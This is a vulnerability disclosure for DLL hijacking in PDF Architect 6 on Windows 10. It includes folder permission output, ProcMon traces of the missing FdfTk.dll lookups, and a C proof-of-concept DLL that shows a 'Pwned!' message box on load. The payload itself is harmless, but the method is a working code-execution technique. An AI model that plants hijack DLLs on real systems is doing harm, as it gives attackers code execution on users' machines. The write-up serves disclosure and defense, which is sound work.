Vulnerability: Untrusted Search Path (DLL Hijacking)
Product: PDF Architect 6
Tested on: Windows 10
Reference: https://cwe.mitre.org/data/definitions/426.html

Analysis
========
PDF Architect (architect.exe) tries to load a DLL that doesn't exist on the system. It is found that the application will load the DLL 
from any different location in Windows. Following below are the details.

Folder Permissions:
C:\Users\testing>icacls "C:\Program Files\PDF Architect 6
C:\Program Files\PDF Architect 6 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files


To prove the application load a DLL that doesn't exist, we used ProcMon to monitor for PID of the application along with 
Result "NAME NOT FOUND". Resulting as in following:

architect.exe	4484	CreateFile	C:\Program Files\PDF Architect 6\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\System32\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\System\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Users\testing\Desktop\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\System32\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\System32\wbem\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
architect.exe	4484	CreateFile	C:\Windows\System32\WindowsPowerShell\v1.0\FdfTk.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a


To demonstrate the issue are valid, we create a fake DLL named "FdfTk.dll". We put in Desktop folder and re-run again architect.exe. 
A pop up of messagebox will propmt first before the application itself gets executed. Below are the example of DLL code we used.

// using cl.exe to compile ---> cl.exe /DL poc.c /out:poc.dll User32.lib
#include <Windows.h>

void msg(){
	MessageBoxA(NULL,"Pwned!", "DLL Hijacking", 0x00000000L);
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			msg();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}
